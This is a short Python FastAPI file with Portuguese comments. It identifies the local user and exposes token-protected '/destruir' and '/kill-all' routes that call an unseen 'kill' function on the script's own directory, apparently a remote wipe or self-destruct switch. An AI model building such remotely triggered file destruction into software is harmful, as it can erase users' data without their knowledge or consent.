from fastapi import FastAPI, HTTPException, Header
import os
from dotenv import load_dotenv
import requests
import sys
import subprocess
from funcoes import identificar_usuario, send, kill

app = FastAPI()
load_dotenv()


## VARIAVEIS ##
secret_token = os.getenv('SECRET_TOKEN')
url = os.getenv('webhook_url_hhh')
diretorio_arquivo = os.path.dirname(__file__)


# Identificação do usuario 
user_identification = identificar_usuario()


# Cria uma rota com a identificação do usuario para deletar somente esse usuario
@app.post(f'/destruir/{user_identification}')
def destruir(token: str = Header(...)):
    if token != secret_token:
        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')

    kill(diretorio_arquivo)

# Rota de Delete All
@app.post('/kill-all')
def kill_all(token: str = Header(...)):
    if token != secret_token:
        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
    
    kill(diretorio_arquivo)